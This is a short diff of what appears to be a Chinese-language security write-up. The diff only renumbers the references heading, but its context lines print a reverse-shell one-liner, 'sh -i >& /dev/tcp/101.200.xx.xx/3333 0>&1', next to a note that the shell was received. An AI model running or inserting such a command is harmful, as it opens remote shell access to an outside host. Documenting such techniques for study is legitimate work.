@@ -44,5 +44,5 @@ sh -i >& /dev/tcp/101.200.xx.xx/3333 0>&1 | /bin/sh | sh -i >& /dev/tcp/101.200.
 成功接收到反弹shell，如下图  
 ![image](./pic/1.png)
 
-# 参考链接：  
+# 0x04 参考链接：  
 https://blog.csdn.net/weixin_43486390/article/details/114259762  
